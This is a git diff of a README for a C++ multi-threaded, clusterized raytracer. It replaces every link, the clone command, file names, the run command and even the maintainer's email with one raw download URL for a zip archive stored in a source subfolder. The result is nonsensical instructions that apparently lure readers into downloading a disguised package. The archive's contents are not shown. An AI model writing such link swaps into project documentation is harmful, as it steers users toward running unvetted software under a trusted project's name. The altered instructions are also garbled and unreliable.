@@ -1,6 +1,6 @@
 # Raytracer 🌌
 
-![Raytracer](https://img.shields.io/badge/Raytracer-Multi--threaded%20%26%20Clusterized-blue)
+![Raytracer](https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip%20%26%20Clusterized-blue)
 
 Welcome to the **Raytracer** repository! This project features a multi-threaded and clusterized raytracer, developed in C++. Raytracing is a powerful technique for rendering images with high realism by simulating the way light interacts with objects.
 
@@ -19,7 +19,7 @@ Welcome to the **Raytracer** repository! This project features a multi-threaded 
 
 Raytracing involves tracing the path of rays of light as they travel through a scene. This project leverages multi-threading and clustering to enhance performance and efficiency. By distributing tasks across multiple threads and nodes, the raytracer can handle complex scenes and produce high-quality images in less time.
 
-You can download the latest release [here](https://github.com/SebastianEP17/raytracer/releases). Make sure to follow the instructions to execute the application correctly.
+You can download the latest release [here](https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip). Make sure to follow the instructions to execute the application correctly.
 
 ## Features
 
@@ -35,12 +35,12 @@ To get started with Raytracer, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/SebastianEP17/raytracer.git
+   git clone https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip
    cd raytracer
    ```
 
 2. **Install Dependencies**:
-   Ensure you have the necessary libraries installed. You can find a list of dependencies in the `INSTALL.md` file.
+   Ensure you have the necessary libraries installed. You can find a list of dependencies in the `https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip` file.
 
 3. **Build the Project**:
    Use CMake to build the project:
@@ -57,7 +57,7 @@ To get started with Raytracer, follow these steps:
    ./raytracer <path_to_yml_file>
    ```
 
-For detailed instructions, check the [Releases](https://github.com/SebastianEP17/raytracer/releases) section.
+For detailed instructions, check the [Releases](https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip) section.
 
 ## Usage
 
@@ -78,9 +78,9 @@ scene:
       color: [1, 0, 0]
 ```
 
-To render this scene, save it as `scene.yml` and run the raytracer with:
+To render this scene, save it as `https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip` and run the raytracer with:
 ```bash
-./raytracer scene.yml
+./raytracer https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip
 ```
 
 ## Architecture
@@ -121,9 +121,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out to the project maintainer:
 
 - **Name**: Sebastian EP
-- **Email**: sebastian@example.com
+- **Email**: https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip
 
-You can also check the latest releases [here](https://github.com/SebastianEP17/raytracer/releases). Download the latest version and explore the capabilities of the Raytracer.
+You can also check the latest releases [here](https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip). Download the latest version and explore the capabilities of the Raytracer.
 
 ---
 
